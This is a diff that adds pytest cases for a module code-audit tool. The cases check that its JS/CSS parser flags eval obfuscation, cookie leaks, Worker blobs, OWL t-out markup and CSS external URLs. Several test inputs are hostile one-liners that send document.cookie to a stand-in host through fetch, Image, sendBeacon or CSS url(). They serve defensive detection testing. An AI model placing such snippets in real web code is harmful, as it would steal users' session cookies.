@@ -180,3 +180,152 @@ def test_m4_runs_private_copy(monkeypatch):
     assert isinstance(res, dict) and res["a.js"]["ok"]
     node, d = seen[0]
     assert node == str(d / "bin" / "node")
+
+
+# --- JS / CSS helper: H8-H11, M3, fixpoint summaries, ts/tsx/jsx/sass ---------------
+
+
+def _web(kind: str, text: str) -> set[tuple[str, str]]:
+    from app.bots import code_audit_web as web
+
+    if web.helper_problem():
+        pytest.skip("parser helper unavailable on this host")
+    r = web.run([("f", kind, text)])["f"]
+    assert r["ok"], r
+    return {(f["sev"], f["code"]) for f in r["findings"]}
+
+
+@pytest.mark.parametrize(
+    "kind,src,want",
+    [
+        # H9: eval / Function as a value
+        ("js", "Reflect.apply(eval, null, [s])", ("high", "js-eval")),
+        ("js", "const e = [eval][0]; e(s)", ("high", "js-eval")),
+        ("js", "eval.call(null, s)", ("high", "js-eval")),
+        ("js", "run(Function, s)", ("high", "js-eval")),
+        ("js", "const f = window['ev' + 'al']; f(s)", ("high", "js-eval")),
+        # H10: folded member names, document alias, cookie-holding variables
+        (
+            "js",
+            "const d=document; const c=d['coo'+'kie']; fetch('https://e.v/?'+c)",
+            ("high", "js-cookie-leak"),
+        ),
+        (
+            "js",
+            "const k='coo'+'kie'; const v=document[k]; new Image().src='//e.v/'+v",
+            ("high", "js-cookie-leak"),
+        ),
+        (
+            "js",
+            "let a = document.cookie; let b = a; navigator.sendBeacon('/x', b)",
+            ("high", "js-cookie-leak"),
+        ),
+        # M3: style URLs and Worker blobs
+        (
+            "js",
+            "el.style.backgroundImage='url(//ext/'+document.cookie+')'",
+            ("high", "js-cookie-leak"),
+        ),
+        (
+            "js",
+            "el.style.setProperty('background', 'url(//e/' + document.cookie + ')')",
+            ("high", "js-cookie-leak"),
+        ),
+        ("js", "new Worker(URL.createObjectURL(new Blob([s])))", ("high", "js-eval")),
+        ("js", "new SharedWorker('data:text/javascript,' + s)", ("high", "js-eval")),
+        ("js", "new Worker(u)", ("medium", "js-script-load")),
+        ("js", "el.style.background = 'url(https://e.v/x.png)'", ("medium", "js-external-request")),
+        # JS fixpoint summaries (3 levels, methods, HTML sinks)
+        (
+            "js",
+            "function a(s){eval(s)} function b(t){a(t)} function c(u){b(u)} c(location.hash)",
+            ("high", "js-flow-sink"),
+        ),
+        ("js", "const o = { r(x) { el.innerHTML = x } }; o.r(data)", ("medium", "js-flow-sink")),
+        ("js", "class K { go(x) { setTimeout(x) } } new K().go(data)", ("high", "js-flow-sink")),
+        # H8: OWL inline templates
+        ("js", "const T = xml`<div t-out='markup(props.html)'/>`", ("high", "owl-t-out")),
+        ("js", "const T = xml`<span t-out='props.label'/>`", ("medium", "owl-t-out")),
+        # H11: CSS escapes and @use/@forward
+        ("css", "a{background:\\75rl(https://e.v/a)}", ("medium", "css-external-url")),
+        ("css", "a{background:u\\72l(https://e.v/a)}", ("medium", "css-external-url")),
+        ("scss", "@use 'https://e.v/x';", ("high", "css-external-import")),
+        ("scss", "@forward 'https://e.v/x';", ("high", "css-external-import")),
+        ("css", "a{background:url(\\6a avascript:alert(1))}", ("high", "css-expression")),
+        # typed sources and indented Sass are parsed, not skipped
+        (
+            "ts",
+            "const x: string = document.cookie; fetch('https://e.v/' + x)",
+            ("high", "js-cookie-leak"),
+        ),
+        ("tsx", "const A = (p: any) => <div />; eval(p as string)", ("high", "js-eval")),
+        ("jsx", "const A = () => <a href={u} />; eval(s)", ("high", "js-eval")),
+        ("sass", "a\n  background: url(https://e.v/a)\n", ("medium", "css-external-url")),
+        ("sass", "@import 'https://e.v/x'\n", ("high", "css-external-import")),
+        ("sass", 'a[value^="a"]\n  background: url(https://e.v/a)\n', ("high", "css-exfiltration")),
+        ("sass", "a\n  background: \\75rl(https://e.v/a)\n", ("medium", "css-external-url")),
+    ],
+)
+def test_web_findings(kind, src, want):
+    assert want in _web(kind, src), (src, _web(kind, src))
+
+
+@pytest.mark.parametrize(
+    "kind,src",
+    [
+        (
+            "js",
+            "if (typeof eval === 'function') {}; x instanceof Function; Function.prototype.bind",
+        ),
+        ("js", "function a(s){eval(s)} a('1+1')"),  # constant argument: only the eval itself
+        ("js", "const T = xml`<b t-out='\"x\"'/><i t-out='markup(\"<b/>\")'/>`"),
+        ("sass", "=m\n  color: red\n.x\n  +m\n  &:hover\n    color: blue\n"),
+    ],
+)
+def test_web_quiet_variants(kind, src):
+    got = _web(kind, src)
+    assert not {x for x in got if x[1] in ("js-flow-sink", "owl-t-out", "css-external-url")}, got
+    if "typeof" in src:
+        assert not got
+
+
+@pytest.mark.parametrize("kind,src", [("ts", "const = ;"), ("css", "@\\69mport url(x")])
+def test_web_unparseable_fails_closed(kind, src):
+    from app.bots import code_audit_web as web
+
+    if web.helper_problem():
+        pytest.skip("parser helper unavailable on this host")
+    assert not web.run([("f", kind, src)])["f"]["ok"]
+
+
+@pytest.mark.parametrize("ext", ["ts", "tsx", "jsx", "sass"])
+def test_typed_sources_are_audited_in_modules(ext):
+    from app.bots import code_audit_web as web
+
+    if web.helper_problem():
+        pytest.skip("parser helper unavailable on this host")
+    body = b"a\n  background: url(https://e.v/a)\n" if ext == "sass" else b"eval(location.hash)\n"
+    r = ca.audit(_zip(BASE | {f"static/src/x.{ext}": body}), version=17, module_name=MOD)
+    codes = {(f.severity, f.code) for f in r.findings if f.file.endswith(ext)}
+    assert codes & {("high", "js-eval"), ("medium", "css-external-url")}, codes
+
+
+# --- H8 in static XML (Python side) -------------------------------------------------
+
+
+@pytest.mark.parametrize(
+    "tpl,sev",
+    [
+        ('<t t-name="x"><div t-out="markup(props.html)"/></t>', "high"),
+        ('<t t-name="x"><div t-out="props.record.data.note"/></t>', "medium"),
+        ('<t t-name="x"><div t-out="\'fixed\'"/></t>', None),
+        ('<t t-name="x"><div t-out="markup(\'&lt;b/&gt;\')"/></t>', None),
+    ],
+)
+def test_h8_owl_static_xml(tpl, sev):
+    xml = f'<?xml version="1.0"?><templates>{tpl}</templates>'.encode()
+    r = ca.audit(_zip(BASE | {"static/src/x.xml": xml}), version=17, module_name=MOD)
+    got = {f.severity for f in r.findings if f.code == "owl-t-out"}
+    assert got == ({sev} if sev else set()), r.findings
+    # OWL expressions are JavaScript: never run through the Python safe_eval audit
+    assert not [f for f in r.findings if f.code in ("unsafe-expression", "expression-call")]
